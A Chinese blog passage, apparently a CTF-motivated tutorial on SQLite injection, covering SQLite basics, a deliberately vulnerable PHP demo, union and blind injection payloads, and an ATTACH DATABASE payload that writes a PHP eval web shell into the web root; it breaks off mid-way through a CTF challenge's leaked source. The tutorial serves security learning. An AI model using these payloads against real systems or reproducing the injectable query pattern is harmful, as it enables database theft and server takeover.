        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlite注入的一点总结</title>
    <url>/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于先知社区，原文链接：<a href="https://xz.aliyun.com/t/8627" target="_blank" rel="noopener">https://xz.aliyun.com/t/8627</a></p>
<p>打iisc的初赛遇到了一道sqlite的题目，发现sqlite的注入遇到的很少，于是干脆梳理一下，总结一下。</p>
</blockquote>
<h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p>
<p><strong>创建数据库</strong></p>
<pre class=" language-sql"><code class="language-sql">sqlite3 test<span class="token number">.db</span></code></pre>
<p>这个命令执行后就会在当前目录下生成对应名称的文件，之后的数据操作都是对该文件的操作。</p>
<p>执行这个命令成功创建数据库文件之后，将提供一个 sqlite&gt; 提示符。</p>
<p>数据库成功创建后可以使用 SQLite 的 .databases 命令来检查它是否在数据库列表中<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16037974037049.jpg" alt=""></p>
<p><strong>打开数据库</strong></p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">Use</span> <span class="token string">".open FILENAME"</span> <span class="token keyword">to</span> reopen <span class="token keyword">on</span> <span class="token number">a</span> persistent <span class="token keyword">database</span><span class="token punctuation">.</span>
sqlite<span class="token operator">></span> <span class="token punctuation">.</span><span class="token keyword">open</span> sqltest<span class="token number">.db</span></code></pre>
<p><strong>导入导出</strong></p>
<pre><code># 导出
$sqlite3 testDB.db .dump &gt; testDB.sql
# 导入
$sqlite3 testDB.db &lt; testDB.sql</code></pre><p><strong>创建表</strong></p>
<p>语句和mysql差不多</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">create</span> <span class="token keyword">table</span> test<span class="token punctuation">(</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> name char<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>查看表</strong></p>
<p> .tables 命令用来列出附加数据库中的所有表。</p>
<pre><code>sqlite&gt; .tables
test</code></pre><p>.schema 命令得到表的完整信息:</p>
<pre><code>sqlite&gt; .schema test
CREATE TABLE test(
id INT PRIMARY KEY     NOT NULL,
name char(50) NOT NULL
);</code></pre><p>值得注意的一点是得到的结果是我们创建表时执行的命令语句，这也是sqlite的特点，之后再说。</p>
<p><strong>插入数据</strong></p>
<p>INSERT INTO 语句用于向数据库的某个表中添加新的数据行。</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'alice'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
sqlite<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> test <span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'bob'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>查询语句</strong></p>
<p>使用select关键字</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span>
id          name
<span class="token comment" spellcheck="true">----------  ----------</span>
<span class="token number">1</span>           alice
<span class="token number">2</span>           bob

sqlite<span class="token operator">></span> <span class="token keyword">select</span> name <span class="token keyword">from</span> test<span class="token punctuation">;</span>
name
<span class="token comment" spellcheck="true">----------</span>
alice
bob</code></pre>
<p>如果查询结果格式比较乱，需要设置格式化输出。</p>
<p><strong>sqlite_master</strong></p>
<p>sqlite_master表中保存数据库表的关键信息。<br>这是sqlite_master表的结构</p>
<pre><code>sqlite&gt; .schema sqlite_master
CREATE TABLE sqlite_master (
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);</code></pre><p>他保存了执行的sql语句，也是之后注入查询表名列名的关键。</p>
<p>从sqlite_master查表名:</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> tbl_name <span class="token keyword">from</span> sqlite_master <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">'table'</span><span class="token punctuation">;</span>
tbl_name
<span class="token comment" spellcheck="true">----------</span>
test</code></pre>
<p>获取表名和列名：</p>
<pre class=" language-sql"><code class="language-sql">sqlite<span class="token operator">></span> <span class="token keyword">select</span> sql <span class="token keyword">from</span> sqlite_master <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">'table'</span><span class="token punctuation">;</span>
sql
<span class="token comment" spellcheck="true">----------------------------------------------------------------------------</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> test<span class="token punctuation">(</span>
id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
name char<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
<span class="token punctuation">)</span></code></pre>
<p><strong>格式化输出</strong></p>
<p>格式化输出内容，能更直观查看命令执行结果。</p>
<pre><code>sqlite&gt;.header on
sqlite&gt;.mode column
sqlite&gt;.timer on
sqlite&gt;</code></pre><p>还有其他的查询语法可以去查询文档。</p>
<h2 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h2><h3 id="Demo代码"><a href="#Demo代码" class="headerlink" title="Demo代码:"></a>Demo代码:</h3><p>数据库数据：</p>
<pre><code>sqlite&gt; create table user_data(
   ...&gt; id INT PRIMARY KEY NOT NULL,
   ...&gt; name char(50) NOT NULL,
   ...&gt; passwd cahr(50) NOT NULL);

sqlite&gt; insert into user_data (id,name,passwd) values (1,&#39;admin&#39;,&#39;password&#39;);
sqlite&gt; insert into user_data (id,name,passwd) values (2,&#39;bob&#39;,&#39;wowowow&#39;);
sqlite&gt; insert into user_data (id,name,passwd) values (3,&#39;flag&#39;,&#39;flag{test}&#39;);
sqlite&gt; select * from user_data;
1|admin|password
2|bob|wowowow
3|flag|flag{test}</code></pre><p>页面：</p>
<pre class=" language-php"><code class="language-php">
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>

<span class="token delimiter">&lt;?php</span>
   <span class="token keyword">class</span> <span class="token class-name">MyDB</span> <span class="token keyword">extends</span> <span class="token class-name">SQLite3</span>
   <span class="token punctuation">{</span>
      <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'user.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
   <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">lastErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token string">"Opened database successfully\n&lt;/br>"</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>

   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$sql</span> <span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
      <span class="token constant">SELECT</span> <span class="token operator">*</span> from user_data where id<span class="token operator">=</span><span class="token string">'$id'</span><span class="token punctuation">;</span>
<span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"Error in fetch "</span><span class="token punctuation">.</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">lastErrorMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$ret</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"ID = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"NAME = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"PASS = "</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>   

   <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<h3 id="union-select-注入和一些查询payload"><a href="#union-select-注入和一些查询payload" class="headerlink" title="union select 注入和一些查询payload"></a>union select 注入和一些查询payload</h3><p>以上demo正常的功能是输入id查询数据库中数据.</p>
<p>测试：<br>正常输入查询<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038582199318.jpg" alt=""></p>
<p>尝试闭合单引号：<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038764678706.jpg" alt=""></p>
<p>闭合语句<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038582992371.jpg" alt=""></p>
<p>使用order by确定查询字段数：</p>
<pre><code>1&#39; order by 3;
1&#39; order by 4;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038583809395.jpg" alt=""></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038764935323.jpg" alt=""></p>
<pre><code>0&#39; union select 1,2,3;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038765322328.jpg" alt=""></p>
<h4 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h4><p>查版本。</p>
<pre><code>0&#39; union select 1,2,sqlite_version();</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038769569244.jpg" alt=""></p>
<h4 id="表名和列名"><a href="#表名和列名" class="headerlink" title="表名和列名"></a>表名和列名</h4><p>查表名和字段。</p>
<pre><code>0&#39; union select 1,2,sql from sqlite_master;
or
0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39;;
or
0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39;;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038770854698.jpg" alt=""></p>
<p>或者：<br>多条记录时可以使用group_concat聚合或者使用limit</p>
<pre><code>0&#39; union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; --
或者使用limit来输出一行结果
0&#39; union select 1,2,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1 --</code></pre><p>limit后面接的数字是截取的行数，而offest后面接的数字则为第一次返回结果中的删除数。在上述查询中，limit提取了两个表名，然后第一个被offset删除掉，所以我们获得了第二个表名。</p>
<p>另外可以通过下面的payload获取到格式化过的列名：</p>
<pre><code>0&#39; union select 1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,&#39;(&#39;)+1)),instr((substr(sql,instr(sql,&#39;(&#39;)+1)),&#39;`&#39;)),&quot;TEXT&quot;,&#39;&#39;),&quot;INTEGER&quot;,&#39;&#39;),&quot;AUTOINCREMENT&quot;,&#39;&#39;),&quot;PRIMARY KEY&quot;,&#39;&#39;),&quot;UNIQUE&quot;,&#39;&#39;),&quot;NUMERIC&quot;,&#39;&#39;),&quot;REAL&quot;,&#39;&#39;),&quot;BLOB&quot;,&#39;&#39;),&quot;NOT NULL&quot;,&#39;&#39;),&quot;,&quot;,&#39;~~&#39;) from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39; --</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16074041125183.jpg" alt=""></p>
<h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><p>查数据</p>
<pre><code>0&#39; union select id,name,passwd from user_data;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038772817163.jpg" alt=""></p>
<p>使用group_concat连接查询结果</p>
<pre><code>0&#39; union select 1,2,group_concat(passwd) from user_data;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16038781525366.jpg" alt=""></p>
<p>当然，hex，limit，substr等也都可以在注入中用来构造语句。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>和其他注入差不多，列举几个注入payload：</p>
<h4 id="Bool"><a href="#Bool" class="headerlink" title="Bool"></a>Bool</h4><p><strong>bool</strong></p>
<blockquote>
<p>没有mid、left等函数</p>
</blockquote>
<pre><code>select * from test where id =1 union select 1,length(sqlite_version())=6

sqlite&gt; select * from test union select 1,length(sqlite_version())=6;
id          name
----------  ----------
1           1
1           alice
2           bob
Run Time: real 0.003 user 0.000115 sys 0.002050
sqlite&gt; select * from test union select 1,length(sqlite_version())=5;
id          name
----------  ----------
1           0
1           alice
2           bob
Run Time: real 0.001 user 0.000133 sys 0.000126</code></pre><pre><code>select * from test where id=1 and length(sqlite_version())=5;

sqlite&gt; select * from test where id=1 and length(sqlite_version())=5;
Run Time: real 0.001 user 0.000065 sys 0.000493
sqlite&gt; select * from test where id=1 and length(sqlite_version())=6;
id          name
----------  ----------
1           alice
Run Time: real 0.001 user 0.000079 sys 0.000115</code></pre><pre><code>select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;;

sqlite&gt; select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;;
id          name
----------  ----------
1           alice
Run Time: real 0.000 user 0.000067 sys 0.000039
sqlite&gt; select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;2&#39;;
Run Time: real 0.000 user 0.000054 sys 0.000031</code></pre><h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep"></a>Sleep</h4><p><strong>sleep</strong></p>
<p>sqlite没有sleep()函数，但是有个函数randomblob(N)，作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。</p>
<p>而且sqlite没有if函数，可以使用case来构造条件</p>
<pre><code>select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);

sqlite&gt; select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);
Run Time: real 6.195 user 5.804650 sys 0.329666</code></pre><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>写shell依靠sqlite的创建数据库功能。</p>
<p>除了前面提到的 <code>sqlite3 test.db</code> 这种方法还可以通过 <code>ATTACH DATABASE</code> 这种方法来实现。</p>
<p><strong>ATTACH</strong></p>
<blockquote>
<p>假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。</p>
</blockquote>
<p>附加：</p>
<pre class=" language-sql"><code class="language-sql">attach <span class="token punctuation">[</span><span class="token keyword">database</span><span class="token punctuation">]</span> filename <span class="token keyword">as</span> database_name<span class="token punctuation">;</span></code></pre>
<p>取消：</p>
<pre class=" language-sql"><code class="language-sql">attach <span class="token punctuation">[</span><span class="token keyword">database</span><span class="token punctuation">]</span> filename <span class="token keyword">as</span> database_name<span class="token punctuation">;</span></code></pre>
<p>如果目标数据库存在，则会直接使用该数据库进行附加，把数据库文件名称与逻辑数据库 ‘database_name’ 绑定在一起。如果目标不存在，则会先创建该数据库，如果数据库文件路径设置在web目录下，就可以实现写shell的功能。</p>
<p>要实现写shell，需要如下操作：</p>
<p>通过 attach 在目标目录新建一个数据库文件  =&gt;  在新数据库创建表。=&gt;  在表中插入payload</p>
<p>在sqlite shell中实现如下：</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16073561510628.jpg" alt=""></p>
<p>但是在我的 demo 中测试时发现，并没有创建对应的文件，应该是没有成功执行attach和后面的代码。再去看了下前面的demo代码，发现查询操作使用的是 query 方法，在使用 exec 方法的时候就可以正常利用了。</p>
<p>payload：</p>
<pre><code>&#39;;ATTACH DATABASE &#39;/var/www/html/sqlite_test/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;); --</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/sqlite_inject/16074030982818.jpg" alt=""></p>
<h2 id="一道题目"><a href="#一道题目" class="headerlink" title="一道题目"></a>一道题目</h2><p>题目叫做SQLManager，页面简单实现了sqlite数据库的管理，实现的功能只有table的创建，展示，record的插入。</p>
<p>存在源码泄漏：</p>
<pre><code>view-source:http://eci-2zeiqyu2obvakg4ee0sx.cloudeci1.ichunqiu.com/.index.php.swp</code></pre><p>拿到源码如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'util.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'build'</span><span class="token punctuation">,</span> <span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'modify'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">"Please build database first."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;> '"</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">"' LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"PRAGMA table_info(`{$tName}`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$cName</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'modify'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'values'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `{$tName}` VALUES (?"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">',?'</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'build'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
